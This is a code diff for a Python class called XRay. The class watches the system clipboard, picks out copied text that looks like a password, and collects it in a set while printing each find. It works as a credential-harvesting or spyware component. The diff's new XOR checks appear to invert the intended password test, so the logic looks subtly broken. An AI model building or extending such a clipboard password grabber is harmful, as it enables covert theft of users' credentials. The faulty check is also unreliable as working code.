@@ -6,7 +6,7 @@ from sshkeyboard import listen_keyboard, stop_listening
 import threading
 
 class XRay:
-    def __init__(self, verbose: bool, nb_caracs: int = 8, specials: bool = True, numbers: bool = True) -> None:
+    def __init__(self, verbose: bool, nb_caracs: int, specials: bool, numbers: bool) -> None:
         self.passwords = set()
         self.conditions = {'nb_caracs': nb_caracs, 'specials': specials, 'numbers': numbers}
         self.exit = False
@@ -25,16 +25,18 @@ class XRay:
 
     # Check if the given text is actually a password according to the conditions of the instance
     def is_password(self, text: str) -> bool:
-        nb = len(text) > self.conditions['nb_caracs']
-        special = utils.has_special_chars(text)
-        numbers = utils.has_numbers(text)
+
+        nb = len(text) >= self.conditions['nb_caracs']
+        special = self.conditions['specials'] ^ utils.has_special_chars(text) # wall headbanger...
+        numbers = self.conditions['numbers'] ^ utils.has_numbers(text)
+        
         return nb & special & numbers
 
     def read_current_data(self) -> None:
         text = clip.paste()
         if self.is_password(text):
             self.passwords.add(text)
-            if self.verbose: print(f"Potential password founded: {text}!")
+            if self.verbose: print(f"Potential password founded: {text}")
             if self.verbose: print(f"Added to the passwords list")
         else:
             if self.verbose: print("Password not found :)")
@@ -50,7 +52,7 @@ class XRay:
             text = clip.paste()
             if self.is_password(text) and password != text:
                 password = text
-                if self.verbose: print(f"Potential password founded: {password}!")
+                if self.verbose: print(f"Potential password founded: {password}")
                 self.passwords.add(password)
                 if self.verbose: print(f"Added to the passwords list")
             
